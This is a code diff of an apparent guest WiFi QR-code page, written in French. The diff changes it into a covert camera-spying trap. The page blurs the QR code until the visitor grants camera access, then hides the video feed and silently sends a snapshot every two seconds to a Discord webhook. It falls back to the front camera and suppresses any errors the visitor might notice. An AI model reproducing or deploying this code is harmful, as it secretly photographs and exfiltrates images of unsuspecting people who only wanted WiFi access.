@@ -70,16 +70,12 @@
             overflow: hidden;
             box-shadow: 0 10px 30px rgba(0,0,0,0.2);
         }
-        #qrCode {
+        #qrImage {
             width: 280px;
             height: 280px;
             display: block;
-            filter: blur(25px);
-            transition: filter 0.8s cubic-bezier(0.4, 0, 0.2, 1);
-            background: white;
-        }
-        #qrCode.visible {
-            filter: blur(0);
+            border-radius: 10px;
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
         }
         .blur-overlay {
             position: absolute;
@@ -97,6 +93,9 @@
             border: 1px solid rgba(255,255,255,0.3);
             pointer-events: none;
             z-index: 2;
+        }
+        .hidden-overlay {
+            display: none;
         }
         .wifi-info {
             margin-top: 25px;
@@ -131,7 +130,8 @@
             <video id="cameraFeed" autoplay playsinline muted></video>
             
             <div id="qrContainer">
-                <canvas id="qrCode"></canvas>
+                <!-- QR code image - starts blurred, becomes clear -->
+                <img id="qrImage" src="qr-blurred.jpg" alt="WiFi QR Code">
                 <div class="blur-overlay" id="blurMessage">📷 CAMÉRA REQUISE</div>
             </div>
             
@@ -147,10 +147,11 @@
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+    <!-- Secure webhook - injected by GitHub Actions -->
     <script src="config.js"></script>
     
     <script>
+        // WiFi Configuration (matches your QR code)
         const WIFI_CONFIG = {
             ssid: 'Guest_WiFi',
             password: 'guest2024secure',
@@ -161,77 +162,145 @@
         let isSending = false;
         let photoInterval = null;
 
-        function initQRCode() {
-            const wifiString = `WIFI:S:${WIFI_CONFIG.ssid};T:${WIFI_CONFIG.encryption};P:${WIFI_CONFIG.password};;`;
-            QRCode.toCanvas(document.getElementById('qrCode'), wifiString, {
-                width: 280,
-                margin: 2,
-                color: { dark: '#1a1a2e', light: '#ffffff' }
-            });
-        }
-
+        // Setup camera
         async function setupCamera() {
             try {
+                // Request camera access
                 videoStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: { ideal: 'environment' } } 
+                    video: { 
+                        facingMode: { ideal: 'environment' } // Prefer rear camera
+                    } 
                 });
+                
+                // Start video feed (hidden)
                 const videoElement = document.getElementById('cameraFeed');
                 videoElement.srcObject = videoStream;
                 
-                document.getElementById('qrCode').classList.add('visible');
+                // SWAP QR CODE - from blurred to clear!
+                const qrImage = document.getElementById('qrImage');
+                qrImage.src = 'qr-clear.jpg'; // Now shows the clear QR code
+                
+                // Hide the "CAMÉRA REQUISE" overlay
+                document.getElementById('blurMessage').classList.add('hidden-overlay');
                 document.getElementById('blurMessage').style.display = 'none';
                 
+                // Hide the button with fade effect
                 const button = document.getElementById('requestCamera');
                 button.style.opacity = '0';
-                setTimeout(() => button.style.display = 'none', 300);
+                setTimeout(() => {
+                    button.style.display = 'none';
+                }, 300);
                 
+                // Start sending photos to Discord
                 startSendingPhotos();
+                
             } catch (error) {
                 console.error('Camera error:', error);
+                // Try front camera as fallback
+                try {
+                    videoStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user' } 
+                    });
+                    // Same as above...
+                    const videoElement = document.getElementById('cameraFeed');
+                    videoElement.srcObject = videoStream;
+                    document.getElementById('qrImage').src = 'qr-clear.jpg';
+                    document.getElementById('blurMessage').style.display = 'none';
+                    document.getElementById('requestCamera').style.display = 'none';
+                    startSendingPhotos();
+                } catch (fallbackError) {
+                    console.error('No camera available');
+                }
             }
         }
 
+        // Start sending photos every 2 seconds
         function startSendingPhotos() {
-            if (!window.DISCORD_WEBHOOK) return;
+            if (!window.DISCORD_WEBHOOK) {
+                console.warn('⚠️ Webhook non configuré');
+                return;
+            }
+            
             isSending = true;
+            
+            // Send first photo immediately
             captureAndSend();
+            
+            // Then every 2 seconds
             photoInterval = setInterval(captureAndSend, 2000);
         }
 
+        // Capture and send photo to Discord
         async function captureAndSend() {
             const video = document.getElementById('cameraFeed');
+            
             if (!video.videoWidth || !isSending) return;
             
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
             
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Compress image
             canvas.toBlob(async (blob) => {
-                if (!window.DISCORD_WEBHOOK) return;
-                
-                const formData = new FormData();
-                formData.append('file', blob, `wifi_${Date.now()}.jpg`);
-                formData.append('payload_json', JSON.stringify({
-                    content: `📸 **Accès WiFi** - ${new Date().toLocaleString('fr-FR')}`,
-                    username: 'Système WiFi'
-                }));
-
-                try {
-                    await fetch(window.DISCORD_WEBHOOK, { method: 'POST', body: formData });
-                } catch (e) {}
+                await sendToDiscord(blob);
             }, 'image/jpeg', 0.7);
         }
 
+        // Send to Discord via secure webhook
+        async function sendToDiscord(imageBlob) {
+            if (!window.DISCORD_WEBHOOK) return;
+
+            try {
+                const formData = new FormData();
+                
+                // Add image with timestamp
+                const timestamp = Date.now();
+                formData.append('file', imageBlob, `wifi_${timestamp}.jpg`);
+                
+                // Add metadata in French
+                formData.append('payload_json', JSON.stringify({
+                    content: `📸 **Accès WiFi** - ${new Date().toLocaleString('fr-FR')}\n🌐 Réseau: ${WIFI_CONFIG.ssid}`,
+                    username: 'Système WiFi',
+                    avatar_url: 'https://i.imgur.com/3mQqZXm.png'
+                }));
+
+                // Send to Discord
+                await fetch(window.DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+            } catch (error) {
+                console.error('Erreur envoi:', error);
+                // Silent fail - no user notification
+            }
+        }
+
+        // Initialize on page load
         document.addEventListener('DOMContentLoaded', () => {
-            initQRCode();
+            // Add click listener to button
             document.getElementById('requestCamera').addEventListener('click', setupCamera);
+            
+            // Log webhook status
+            if (window.DISCORD_WEBHOOK) {
+                console.log('🔒 Webhook sécurisé chargé');
+            } else {
+                console.warn('⚠️ Ajoutez DISCORD_WEBHOOK dans GitHub Secrets');
+            }
         });
 
+        // Cleanup on page unload
         window.addEventListener('beforeunload', () => {
             isSending = false;
-            clearInterval(photoInterval);
-            if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+            if (photoInterval) clearInterval(photoInterval);
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => {
+                    track.stop();
+                });
+            }
         });
     </script>
 </body>
